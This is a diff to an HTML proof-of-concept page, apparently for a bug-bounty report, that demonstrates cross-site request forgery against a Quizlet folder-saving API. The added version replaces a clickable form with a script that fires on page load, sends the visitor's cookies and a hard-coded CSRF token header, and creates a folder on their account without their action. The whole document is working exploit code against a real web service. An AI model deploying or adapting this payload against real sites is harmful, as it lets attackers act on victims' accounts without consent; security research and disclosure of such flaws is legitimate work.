@@ -1,10 +1,27 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF PoC - Save Folder</h2>
-    <form action="https://quizlet.com/webapi/3.2/folders/save?_method=PUT" method="POST" enctype="application/x-www-form-urlencoded">
-      <input type="hidden" name="data" value='[{"name":"api2","description":""}]'>
-      <input type="submit" value="Click to CSRF">
-    </form>
+    <h3>CSRF PoC with Cs-Token</h3>
+    <script>
+      window.onload = function () {
+        fetch("https://quizlet.com/webapi/3.2/folders/save?_method=PUT", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json",
+            "Cs-Token": "777KPGM3bmXwpW9PChQGyk"
+          },
+          body: JSON.stringify({
+            data: [
+              {
+                name: "api2",
+                description: ""
+              }
+            ]
+          })
+        }).then(res => res.text())
+          .then(text => console.log("Response:", text));
+      };
+    </script>
   </body>
 </html>
